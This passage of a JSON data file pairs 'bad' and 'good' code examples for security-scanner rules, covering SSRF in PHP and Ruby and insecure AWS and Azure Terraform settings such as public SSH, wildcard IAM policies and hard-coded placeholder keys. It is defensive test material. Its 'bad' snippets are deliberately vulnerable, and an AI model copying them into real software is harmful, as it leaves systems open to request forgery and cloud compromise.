    "code": "<?php\n    function test1(){\n        //ruleid: php-ssrf\n        $ch = curl_init($_GET['r']);\n    }\n\n    function test2(){\n        //ruleid: php-ssrf\n        $url = $_GET['r'];\n        $ch = curl_init($url);\n    }\n\n    function test3(){\n        $ch = curl_init();\n        //ruleid: php-ssrf\n        curl_setopt($ch, CURLOPT_URL, $_POST['image_url']);\n    }\n\n    function test4(){\n        $ch = curl_init();\n        //ruleid: php-ssrf\n        $url = $_GET['r'];\n        curl_setopt($ch, CURLOPT_URL, $url);\n    }\n?>",
    "language": "php",
    "description": "curl with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "<?php\n    function test5(){\n        //ruleid: php-ssrf\n        $url = $_GET['r'];\n        $file = fopen($url, 'rb');\n    }\n\n    function test6(){\n        //ruleid: php-ssrf\n        $file = fopen($_POST['r'], 'rb');\n    }\n\n    function test7(){\n        //ruleid: php-ssrf\n        $url = $_POST['r'];\n        $file = file_get_contents($url);\n    }\n\n    function test8(){\n        //ruleid: php-ssrf\n        $file = file_get_contents($_POST['r']);\n    }\n?>",
    "language": "php",
    "description": "fopen/file_get_contents with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "<?php\n    function test9(){\n        //ok: php-ssrf\n        $file = file_get_contents(\"index.php\");\n    }\n\n    function test10(){\n        //ok: php-ssrf\n        $url = $_POST['r'];\n        $file = fopen(\"/tmp/test.txt\", 'rb');\n    }\n?>",
    "language": "php",
    "description": "hardcoded URLs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "<?php\n\nfunction test1() {\n    // ruleid: tainted-url-host\n    $url = 'https://'.$_GET['url'].'/foobar';\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test2() {\n    $part = $_POST['url'];\n    // ruleid: tainted-url-host\n    $url = \"https://$part/foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test3() {\n    // ruleid: tainted-url-host\n    $url = \"https://{$_REQUEST['url']}/foobar\";\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test4() {\n    // ruleid: tainted-url-host\n    $url = sprintf('https://%s/%s/', $_COOKIE['foo'], $bar);\n    $info = make_request($url);\n    return $info;\n}",
    "language": "php",
    "description": "tainted URL host"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "<?php\n\nfunction test1() {\n    // ok: tainted-url-host\n    $url = 'https://www.google.com/'.$_GET['url'].'/foobar';\n    $info = make_request($url);\n    return $info;\n}\n\nfunction test3() {\n    // ok: tainted-url-host\n    $url = \"https://www.google.com/{$_REQUEST['url']}/foobar\";\n    $info = make_request($url);\n    return $info;\n}",
    "language": "php",
    "description": "fixed host, user data in path only"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "<?php\n\n$tainted = $_GET[\"tainted\"];\n// ruleid: tainted-filename\nhash_file('sha1', $tainted);\n\n// ruleid: tainted-filename\nfile($tainted);\n\n// ruleid: tainted-filename\nfile(dirname($tainted));",
    "language": "php",
    "description": "tainted filename leading to SSRF"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "<?php\n\n$tainted = $_GET[\"tainted\"];\n\n// ok: tainted-filename\nhash_file($tainted, 'file.txt');\n\n// Sanitized\n// ok: tainted-filename\nfile(basename($tainted));",
    "language": "php",
    "description": "sanitized filename"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "require 'net/http'\n\ndef foo\n  url = params[:url]\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP.get(url, \"/index.html\")\n\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP.get_response(params[:url])\n\n  uri = URI(params[:url])\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP.post(uri)\n\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP.post_form(URI(params[:url]))\n\n  uri = URI(params[:server])\n  # ruleid: avoid-tainted-http-request\n  req = Net::HTTP::Get.new uri\n\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP.start(uri.host, uri.port) do |http|\n    # ruleid: avoid-tainted-http-request\n    req = Net::HTTP::Get.new uri\n    resp = http.request request\n  end\n\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP::Get.new(params[:url])\n\n  # ruleid: avoid-tainted-http-request\n  Net::HTTP::Post.new(URI(params[:url]))\nend",
    "language": "ruby",
    "description": "Rails - tainted HTTP request"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "require 'net/http'\n\ndef foo\n  # ok: avoid-tainted-http-request\n  Net::HTTP.get(\"example.com\", \"/index.html\")\n\n  uri = URI(\"example.com/index.html\")\n  # ok: avoid-tainted-http-request\n  Net::HTTP::Get.new(uri)\nend",
    "language": "ruby",
    "description": "Ruby - hardcoded URLs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "bad",
    "code": "resource \"aws_instance\" \"test-instance-bad-http-tokens-optional\" {\n  ami = \"ami-0d5eff06f840b45e9\"\n\n  metadata_options {\n    http_endpoint = \"enabled\"\n    # ruleid: ec2-imdsv1-optional\n    http_tokens = \"optional\"\n  }\n}\n\n# ruleid: ec2-imdsv1-optional\nresource \"aws_instance\" \"test-instance-bad-no-metadata-options\" {\n  ami = \"ami-0d5eff06f840b45e9\"\n}\n\n# ruleid: ec2-imdsv1-optional\nresource \"aws_instance\" \"test-instance-bad-v3-http-tokens-default-optional\" {\n  ami = \"ami-0d5eff06f840b45e9\"\n  metadata_options {\n    http_endpoint = \"enabled\"\n  }\n}",
    "language": "hcl",
    "description": "AWS EC2 IMDSv1 optional - allows SSRF to metadata"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Server-Side Request Forgery",
    "type": "good",
    "code": "# ok: ec2-imdsv1-optional\nresource \"aws_instance\" \"test-instance-good\" {\n  ami = \"ami-0d5eff06f840b45e9\"\n  metadata_options {\n    http_endpoint = \"enabled\"\n    http_tokens = \"required\"\n  }\n}",
    "language": "hcl",
    "description": "AWS EC2 IMDSv2 required - mitigates SSRF to metadata"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-ec2-has-public-ip\nresource \"aws_instance\" \"public\" {\n  ami           = \"ami-12345\"\n  instance_type = \"t3.micro\"\n\n  associate_public_ip_address = true\n}",
    "language": "hcl",
    "description": "EC2 - instance with public IP"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_instance\" \"private\" {\n  ami           = \"ami-12345\"\n  instance_type = \"t3.micro\"\n\n  associate_public_ip_address = false\n}",
    "language": "hcl",
    "description": "EC2 - instance without public IP"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-ec2-has-public-ip\nresource \"aws_launch_template\" \"public\" {\n  image_id      = \"ami-12345\"\n  instance_type = \"t3.micro\"\n\n  network_interfaces {\n    associate_public_ip_address = true\n  }\n}",
    "language": "hcl",
    "description": "EC2 - launch template with public IP"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_launch_template\" \"private\" {\n  image_id      = \"ami-12345\"\n  instance_type = \"t3.micro\"\n\n  network_interfaces {\n    associate_public_ip_address = false\n  }\n}",
    "language": "hcl",
    "description": "EC2 - launch template without public IP"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_security_group\" \"fail_open_1\" {\n  vpc_id = aws_vpc.example.id\n\n  # ruleid: aws-ec2-security-group-allows-public-ingress\n  ingress {\n    protocol    = \"tcp\"\n    from_port   = 22\n    to_port     = 22\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}",
    "language": "hcl",
    "description": "EC2 - security group allowing public SSH access"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_security_group\" \"pass_inside_private_network_1\" {\n  vpc_id = aws_vpc.example.id\n\n  # ok: aws-ec2-security-group-allows-public-ingress\n  ingress {\n    protocol    = \"tcp\"\n    from_port   = 22\n    to_port     = 22\n    cidr_blocks = [\"10.0.0.0/8\"]\n  }\n}",
    "language": "hcl",
    "description": "EC2 - security group with restricted CIDR"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-ebs-volume-unencrypted\nresource \"aws_ebs_volume\" \"fail_1\" {\n  availability_zone = \"us-west-2a\"\n}\n\n# ruleid: aws-ebs-volume-unencrypted\nresource \"aws_ebs_volume\" \"fail_2\" {\n  availability_zone = \"us-west-2a\"\n  encrypted         = false\n}",
    "language": "hcl",
    "description": "EBS - unencrypted volume"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-ebs-volume-unencrypted\nresource \"aws_ebs_volume\" \"pass\" {\n  availability_zone = \"us-west-2a\"\n  encrypted         = true\n}",
    "language": "hcl",
    "description": "EBS - encrypted volume"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-s3-bucket-object-encrypted-with-cmk\nresource \"aws_s3_bucket_object\" \"fail\" {\n  bucket       = aws_s3_bucket.object_bucket.bucket\n  key          = \"tf-testing-obj-%[1]d-encrypted\"\n  content      = \"Keep Calm and Carry On\"\n  content_type = \"text/plain\"\n}",
    "language": "hcl",
    "description": "S3 - object without CMK encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_s3_bucket_object\" \"pass\" {\n  bucket       = aws_s3_bucket.object_bucket.bucket\n  key          = \"tf-testing-obj-%[1]d-encrypted\"\n  content      = \"Keep Calm and Carry On\"\n  content_type = \"text/plain\"\n  kms_key_id   = aws_kms_key.example.arn\n}",
    "language": "hcl",
    "description": "S3 - object with CMK encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-rds-backup-no-retention\nresource \"aws_rds_cluster\" \"fail2\" {\n  backup_retention_period = 0\n}\n\n# ruleid: aws-rds-backup-no-retention\nresource \"aws_db_instance\" \"fail\" {\n  backup_retention_period = 0\n}",
    "language": "hcl",
    "description": "RDS - without backup retention"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_rds_cluster\" \"pass\" {\n  backup_retention_period = 35\n}\n\nresource \"aws_db_instance\" \"pass\" {\n  backup_retention_period = 35\n}",
    "language": "hcl",
    "description": "RDS - with backup retention"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_iam_policy\" \"fail3\" {\n  name = \"fail3\"\n  path = \"/\"\n  # ruleid: aws-iam-admin-policy\n  policy = <<POLICY\n{\n  \"Statement\": [\n    {\n      \"Action\": \"*\",\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\",\n      \"Sid\": \"\"\n    }\n  ],\n  \"Version\": \"2012-10-17\"\n}\nPOLICY\n}",
    "language": "hcl",
    "description": "IAM - policy with wildcard admin access"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_iam_policy\" \"pass1\" {\n  name = \"pass1\"\n  path = \"/\"\n  policy = <<POLICY\n{\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"s3:ListBucket*\",\n        \"s3:HeadBucket\",\n        \"s3:Get*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": [\n        \"arn:aws:s3:::b1\",\n        \"arn:aws:s3:::b1/*\",\n        \"arn:aws:s3:::b2\",\n        \"arn:aws:s3:::b2/*\"\n      ],\n      \"Sid\": \"\"\n    },\n    {\n      \"Action\": \"s3:PutObject*\",\n      \"Effect\": \"Allow\",\n      \"Resource\": \"arn:aws:s3:::b1/*\",\n      \"Sid\": \"\"\n    }\n  ],\n  \"Version\": \"2012-10-17\"\n}\nPOLICY\n}",
    "language": "hcl",
    "description": "IAM - policy with specific permissions"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_iam_role\" \"bad\" {\n  name = var.role_name\n  # ruleid: wildcard-assume-role\n  assume_role_policy = <<POLICY\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {}\n    }\n  ]\n}\nPOLICY\n}",
    "language": "hcl",
    "description": "IAM - wildcard AssumeRole policy"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_iam_role\" \"ok\" {\n  name = var.role_name\n  # ok: wildcard-assume-role\n  assume_role_policy = <<POLICY\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n      \"Condition\": {}\n    }\n  ]\n}\nPOLICY\n}",
    "language": "hcl",
    "description": "IAM - restricted AssumeRole policy"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_lambda_function\" \"fail\" {\n  function_name = \"stest-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n\n  environment {\n    variables = {\n      # ruleid: aws-lambda-environment-credentials\n      AWS_ACCESS_KEY_ID     = \"AKIAIOSFODNN7EXAMPLE\",\n      # ruleid: aws-lambda-environment-credentials\n      AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n      AWS_DEFAULT_REGION    = \"us-west-2\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "Lambda - with hard-coded credentials"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_lambda_function\" \"pass\" {\n  function_name = \"test-env\"\n  role = \"\"\n  runtime = \"python3.8\"\n\n  environment {\n    variables = {\n      AWS_DEFAULT_REGION = \"us-west-2\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "Lambda - without credentials"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-lambda-permission-unrestricted-source-arn\nresource \"aws_lambda_permission\" \"fail_1\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n}\n\n# ruleid: aws-lambda-permission-unrestricted-source-arn\nresource \"aws_lambda_permission\" \"fail_3\" {\n  statement_id  = \"AllowMyDemoAPIInvoke\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = \"MyDemoFunction\"\n  principal     = \"apigateway.amazonaws.com\"\n}",
    "language": "hcl",
    "description": "Lambda - permission without source ARN"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-lambda-permission-unrestricted-source-arn\nresource \"aws_lambda_permission\" \"pass_1\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n  source_arn    = aws_sns_topic.default.arn\n}\n\n# ok: aws-lambda-permission-unrestricted-source-arn\nresource \"aws_lambda_permission\" \"pass_3\" {\n  statement_id  = \"AllowMyDemoAPIInvoke\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = \"MyDemoFunction\"\n  principal     = \"apigateway.amazonaws.com\"\n\n  # The /* part allows invocation from any stage, method and resource path\n  # within API Gateway.\n  source_arn = \"${aws_api_gateway_rest_api.MyDemoAPI.execution_arn}/*\"\n}",
    "language": "hcl",
    "description": "Lambda - permission with source ARN"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail1\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n}\n\n# ruleid: aws-kms-no-rotation\nresource \"aws_kms_key\" \"fail2\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  enable_key_rotation = false\n}",
    "language": "hcl",
    "description": "KMS - key without rotation"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_kms_key\" \"pass1\" {\n  description             = \"KMS key 1\"\n  deletion_window_in_days = 10\n  enable_key_rotation = true\n}",
    "language": "hcl",
    "description": "KMS - key with rotation enabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"fail_1\" {\n  name = \"terraform-example-queue\"\n}\n\n# ruleid: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"fail_2\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = false\n}",
    "language": "hcl",
    "description": "SQS - unencrypted queue"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"pass_1\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = true\n}\n\n# ok: aws-sqs-queue-unencrypted\nresource \"aws_sqs_queue\" \"pass_2\" {\n  name                              = \"terraform-example-queue\"\n  kms_master_key_id                 = \"alias/aws/sqs\"\n  kms_data_key_reuse_period_seconds = 300\n}",
    "language": "hcl",
    "description": "SQS - encrypted queue"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-sns-topic-unencrypted\nresource \"aws_sns_topic\" \"fail\" {}",
    "language": "hcl",
    "description": "SNS - unencrypted topic"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-sns-topic-unencrypted\nresource \"aws_sns_topic\" \"pass\" {\n  kms_master_key_id = \"someKey\"\n}",
    "language": "hcl",
    "description": "SNS - encrypted topic"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-dynamodb-table-unencrypted\nresource \"aws_dynamodb_table\" \"default\" {\n  name           = \"GameScores\"\n  billing_mode   = \"PROVISIONED\"\n  read_capacity  = 20\n  write_capacity = 20\n  hash_key       = \"UserId\"\n  range_key      = \"UserId\"\n\n  attribute {\n    name = \"UserId\"\n    type = \"S\"\n  }\n}\n\n# ruleid: aws-dynamodb-table-unencrypted\nresource \"aws_dynamodb_table\" \"encrypted_no_cmk\" {\n  name           = \"GameScores\"\n  billing_mode   = \"PROVISIONED\"\n  read_capacity  = 20\n  write_capacity = 20\n  hash_key       = \"UserId\"\n  range_key      = \"UserId\"\n\n  attribute {\n    name = \"UserId\"\n    type = \"S\"\n  }\n\n  server_side_encryption {\n      enabled = true\n  }\n}",
    "language": "hcl",
    "description": "DynamoDB - without CMK encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_dynamodb_table\" \"cmk\" {\n  name           = \"GameScores\"\n  billing_mode   = \"PROVISIONED\"\n  read_capacity  = 20\n  write_capacity = 20\n  hash_key       = \"UserId\"\n  range_key      = \"UserId\"\n\n  attribute {\n    name = \"UserId\"\n    type = \"S\"\n  }\n\n  server_side_encryption {\n      enabled = true\n      kms_key_arn = \"arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n  }\n}",
    "language": "hcl",
    "description": "DynamoDB - with CMK encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"fail_1\" {\n  name = \"example\"\n}\n\n# ruleid: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"fail_2\" {\n  name                 = \"example\"\n  image_tag_mutability = \"MUTABLE\"\n}",
    "language": "hcl",
    "description": "ECR - with mutable tags"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-ecr-mutable-image-tags\nresource \"aws_ecr_repository\" \"pass\" {\n  name                 = \"example\"\n  image_tag_mutability = \"IMMUTABLE\"\n}",
    "language": "hcl",
    "description": "ECR - with immutable tags"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-cloudtrail-encrypted-with-cmk\nresource \"aws_cloudtrail\" \"fail\" {\n  name                          = \"TRAIL\"\n  s3_bucket_name                = aws_s3_bucket.test.id\n  include_global_service_events = true\n}",
    "language": "hcl",
    "description": "CloudTrail - without encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_cloudtrail\" \"pass\" {\n  name                          = \"TRAIL\"\n  s3_bucket_name                = aws_s3_bucket.test.id\n  include_global_service_events = true\n  kms_key_id                    = aws_kms_key.test.arn\n}",
    "language": "hcl",
    "description": "CloudTrail - with CMK encryption"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-elasticsearch-insecure-tls-version\nresource \"aws_elasticsearch_domain\" \"badCode\" {\n  domain_name = \"badCode\"\n  domain_endpoint_options {\n    enforce_https = true\n    tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n  }\n}",
    "language": "hcl",
    "description": "Elasticsearch - with insecure TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_elasticsearch_domain\" \"okCode\" {\n  domain_name = \"okCode\"\n  domain_endpoint_options {\n    enforce_https = true\n    tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n  }\n}",
    "language": "hcl",
    "description": "Elasticsearch - with TLS 1.2"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_lb_listener\" \"https_2016\" {\n  load_balancer_arn = var.aws_lb_arn\n  protocol          = \"HTTPS\"\n  port              = \"443\"\n  # ruleid: insecure-load-balancer-tls-version\n  ssl_policy        = \"ELBSecurityPolicy-2016-08\"\n  certificate_arn   = var.certificate_arn\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}\n\nresource \"aws_lb_listener\" \"http\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ruleid: insecure-load-balancer-tls-version\n  protocol          = \"HTTP\"\n  port              = \"80\"\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}",
    "language": "hcl",
    "description": "Load Balancer - with insecure TLS"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_lb_listener\" \"https_fs_1_2\" {\n  load_balancer_arn = var.aws_lb_arn\n  protocol          = \"HTTPS\"\n  port              = \"443\"\n  # ok: insecure-load-balancer-tls-version\n  ssl_policy        = \"ELBSecurityPolicy-FS-1-2-Res-2019-08\"\n  certificate_arn   = var.certificate_arn\n\n  default_action {\n    type             = \"forward\"\n    target_group_arn = var.aws_lb_target_group_arn\n  }\n}\n\nresource \"aws_lb_listener\" \"http_redirect\" {\n  load_balancer_arn = var.aws_lb_arn\n  # ok: insecure-load-balancer-tls-version\n  protocol          = \"HTTP\"\n  port              = \"80\"\n\n  default_action {\n    type = \"redirect\"\n\n    redirect {\n      port        = \"443\"\n      protocol    = \"HTTPS\"\n      status_code = \"HTTP_301\"\n    }\n  }\n}",
    "language": "hcl",
    "description": "Load Balancer - with TLS 1.2+"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"fail_1\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = true\n}\n\n# ruleid: aws-subnet-has-public-ip-address\nresource \"aws_default_subnet\" \"fail_2\" {\n  availability_zone = \"us-west-2a\"\n}",
    "language": "hcl",
    "description": "VPC - subnet with public IP assignment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"pass_1\" {\n  vpc_id = \"vpc-123456\"\n}\n\n# ok: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"pass_2\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = false\n}\n\n# ok: aws-subnet-has-public-ip-address\nresource \"aws_default_subnet\" \"pass_3\" {\n  availability_zone       = \"us-west-2a\"\n  map_public_ip_on_launch = false\n}",
    "language": "hcl",
    "description": "VPC - subnet without public IP assignment"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "resource \"aws_codebuild_project\" \"fail_1\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ruleid: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    encryption_disabled = true\n    type                = \"CODEPIPELINE\"\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n  }\n}",
    "language": "hcl",
    "description": "CodeBuild - with unencrypted artifacts"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "resource \"aws_codebuild_project\" \"pass_4\" {\n  name         = \"test-project\"\n  service_role = aws_iam_role.example.arn\n\n  # ok: aws-codebuild-artifacts-unencrypted\n  artifacts {\n    type                = \"CODEPIPELINE\"\n    encryption_disabled = false\n  }\n\n  environment {\n    compute_type = \"BUILD_GENERAL1_SMALL\"\n    image        = \"aws/codebuild/standard:1.0\"\n    type         = \"LINUX_CONTAINER\"\n  }\n\n  source {\n    type            = \"GITHUB\"\n    location        = \"https://github.com/mitchellh/packer.git\"\n    git_clone_depth = 1\n  }\n}",
    "language": "hcl",
    "description": "CodeBuild - with encrypted artifacts"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "bad",
    "code": "provider \"aws\" {\n  region     = \"us-west-2\"\n  access_key = \"AKIAEXAMPLEKEY\"\n  # ruleid: aws-provider-static-credentials\n  secret_key = \"randomcharactersabcdef\"\n  profile = \"customprofile\"\n}",
    "language": "hcl",
    "description": "AWS Provider - with hard-coded credentials"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure AWS Terraform Configurations",
    "type": "good",
    "code": "# ok: aws-provider-static-credentials\nprovider \"aws\" {\n  region                  = \"us-west-2\"\n  shared_credentials_file = \"/Users/tf_user/.aws/creds\"\n  profile                 = \"customprofile\"\n}",
    "language": "hcl",
    "description": "AWS Provider - using shared credentials file"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: storage-use-secure-tls-policy\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                     = \"storageaccountname\"\n  resource_group_name      = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n}\n\n# ruleid: storage-use-secure-tls-policy\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                     = \"storageaccountname\"\n  resource_group_name      = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n  min_tls_version          = \"TLS1_0\"\n}",
    "language": "hcl",
    "description": "Azure Storage - TLS version missing or outdated"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "good",
    "code": "resource \"azurerm_storage_account\" \"good_example\" {\n  name                     = \"storageaccountname\"\n  resource_group_name      = azurerm_resource_group.example.name\n  location                 = azurerm_resource_group.example.location\n  min_tls_version          = \"TLS1_2\"\n}",
    "language": "hcl",
    "description": "Azure Storage - TLS 1.2 enforced"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure Azure Terraform Configurations",
    "type": "bad",
    "code": "# ruleid: storage-default-action-deny\nresource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n  default_action             = \"Allow\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}",
    "language": "hcl",
    "description": "Azure Storage - network rules allow all traffic"
  },
  {
    "ruleId": "",
